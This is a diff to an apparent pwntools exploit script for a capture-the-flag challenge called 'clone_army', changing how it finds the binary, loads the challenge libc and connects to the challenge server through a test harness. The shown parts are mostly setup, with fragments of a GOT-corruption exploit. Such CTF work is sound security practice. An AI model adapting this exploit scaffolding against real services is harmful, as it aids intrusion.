@@ -1,5 +1,16 @@
 #!/usr/bin/env python3
+import os
 from pwn import *
+
+# `pwnmake check` runs us from the challenge dir with a `.build/` symlink to the
+# from-source build and a `publish/` symlink to the published files. Prefer the
+# from-source binary (matches what's deployed), fall back to the committed copy.
+
+def _pick(*cands):
+	for c in cands:
+		if os.path.exists(c):
+			return c
+	return cands[-1]
 
 def int_as_float(i: int) -> float:
 	assert isinstance(i, int)
@@ -27,7 +38,7 @@ def reply(r, q: bytes, a: bytes):
 	prompt_response(r, a)
 
 
-exe = ELF(".build/clone_army")
+exe = ELF(_pick(".build/clone_army", "clone_army"))
 context.binary = exe
 context.terminal = ["tmux", "splitw", "-h"]
 # context.log_level = "debug"
@@ -53,25 +64,17 @@ if corruptsym_got % sizeof_clone != 0x8:
 	assert corruptsym_got % sizeof_clone == 0x8
 
 
-if args.REMOTE:
-	libc = ELF("publish/clone_army-libc.so", checksec=False)
-	
-	host = args.HOST or "localhost"
-	port = int(args.PORT or 25001)
-	
-	info(f"Connecting to {host}:{port}")
-	r = remote(host, port)
-else:
-	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
-	
-	if args.DEBUG:
-		info("Running under debugger")
-		r = exe.debug(gdbscript="""
-			c
-		""")
-	else:
-		info("Running locally")
-		r = exe.process()
+# The intended exploit needs the exact challenge libc (for the offset between
+# functions), which is published alongside the binary.
+libc = ELF("publish/clone_army-libc.so", checksec=False)
+
+# `pwnmake check` sets HOST/PORT (localhost + container port locally,
+# CTF_REMOTE_HOST + port with REMOTE=1). Keep defaults for manual runs.
+host = os.environ.get("HOST", "localhost")
+port = int(os.environ.get("PORT", 25001))
+
+info(f"Connecting to {host}:{port}")
+r = remote(host, port)
 
 
 initial_data = r.recv(10, timeout=1)
